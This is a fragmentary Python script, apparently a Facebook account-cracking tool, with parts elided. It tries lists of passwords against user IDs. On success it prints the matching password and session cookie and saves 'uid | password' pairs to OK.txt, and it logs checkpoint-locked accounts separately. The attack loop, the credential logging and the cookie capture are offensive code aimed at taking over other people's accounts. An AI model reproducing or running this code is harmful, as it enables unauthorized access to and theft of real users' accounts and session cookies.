...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO PRINC LIMON RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    print(' [+] OK Ids saved in L-S/OK.txt')
    print(' [+] CP Ids saved in L-S/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def Akashsexy2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[𝔹ℝ𝕆𝕋ℍ𝔼ℝ]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[L-X-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/LX/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[L-X-CP☠️] {uid}|{ps}")
                open('/sdcard/L-X-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
